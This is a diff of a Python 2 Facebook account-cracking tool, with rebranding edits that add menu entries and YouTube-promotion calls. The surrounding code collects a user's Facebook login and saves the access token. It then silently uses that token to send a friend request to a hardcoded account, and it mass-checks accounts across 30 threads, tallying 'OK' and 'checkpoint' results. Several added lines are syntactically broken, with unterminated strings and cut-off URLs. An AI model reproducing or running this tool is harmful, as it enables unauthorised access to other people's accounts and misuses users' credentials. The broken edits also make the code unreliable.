@@ -1,8 +1,9 @@
+ 
 #!/usr/bin/python2
 #coding=utf-8
 #The Credit For This Code Goes To Nisar Mahsud Tech
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2020d
+#Reserved2020
 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -179,7 +180,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;97mWrong Password"
-            
+            os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
+    else:
+        print "\033[1;97mWrong Username"
+        os.system('xdg-open https://www.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
 
 ##### LICENSE #####
 #=================#
@@ -196,8 +200,10 @@ def login():
         time.sleep(0.05)
         print "\033[1;93m[3]\033[1;45m\033[1;32mDownload Token App               \033[1;0m"
         time.sleep(0.05)
-        
-        
+        print "\033[1;94m[4]\033[1;45m\033[1;32mSubscribe Nisar mahsud     
+        time.sleep(0.05)
+	
+        time.sleep(0.05)
         print "\033[1;95m[0]\033[1;45m\033[1;34mExit                             \033[1;0m"
 	time.sleep(0.05)
 	pilih_login()
@@ -214,7 +220,12 @@ def pilih_login():
         elif peak =="3":
 	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 	        login()
-       
+        elif peak =="4":
+	        os.system('xdg-open https://www.youtue.com')
+	        login()
+        elif peak =="5":
+	        os.system('xdg-open https://www.youtube.com/c
+                login()
 	elif peak =="0":
 		keluar()
         else:
@@ -232,7 +243,7 @@ def login1():
 		print logo                
 		print('\033[1;95m[+]\033[1;45m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;95m \033[1;0m' )
 		print('	' )
-		id = raw_input('\033[1;95m[!] \x1b[1;95mNumber/Email\x1b[1;95m: \x1b[1;95m')
+		id = raw_input('\033[1;95m[!]5\x1b[1;95mNumber/Email\x1b[1;95m: \x1b[1;95m')
 		pwd = raw_input('\033[1;95m[+] \x1b[1;95mPassword\x1b[1;95m    : \x1b[1;95m')
 		tik()
 		try:
@@ -261,7 +272,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\033[1;45m\033[1;92mwaqas tool Login Successful\033[1;0m'
-				os.system('xdg-open https://www.youtube.com/channel/UCh5Oh8nCreLXeMw8Gq4TV-A/featured?view_as=subscriber
+				os.system('xdg-open https://www.youtube.com/c
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -318,7 +329,7 @@ def menu():
 	time.sleep(0.05)
 	print "\033[1;93m[2]\033[1;45m\033[1;32mID Not Found Problem Solve                     \033[1;0m"
 	time.sleep(0.05)
-	print "\033[1;94m[3]\033[1;45m\033[1;32mRest/Update Nisar                         \033[1;0m"
+	print "\033[1;94m[3]\033[1;45m\033[1;32mRest/Update Usman                         \033[1;0m"
 	time.sleep(0.05)
 	print "\033[1;95m[0]\033[1;45m\033[1;35mExit                                      \033[1;0m"
 	time.sleep(0.05)
@@ -469,7 +480,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Nisar-TECH
+			pass #Dev:NISAR-TECH
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -678,11 +689,11 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-#Dev: Nisar Mahsud
-        print "\033[1;95m•-----------------\033[1;35m👺Nisar\033[1;95m-----------------•"
+#Dev: Nisar-TECH
+        print "\033[1;95m•-----------------\033[1;35m👺USMAN\033[1;95m-----------------•"
 	print '\033[1;95m[+]\033[1;45m \033[1;32mProcess Has Been Completed\033[1;0m'
 	print"\033[1;95m[+]\033[1;95mTotal \033[1;95mOK/\x1b[1;95mCP \033[1;95m: \033[1;95m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
-	print "\033[1;95m«-----------------\033[1;35m👺Nisar👺\033[1;95m-----------------»"
+	print "\033[1;95m«-----------------\033[1;35m👺NIsar👺\033[1;95m-----------------»"
 	print """
  \033[1;95m
 
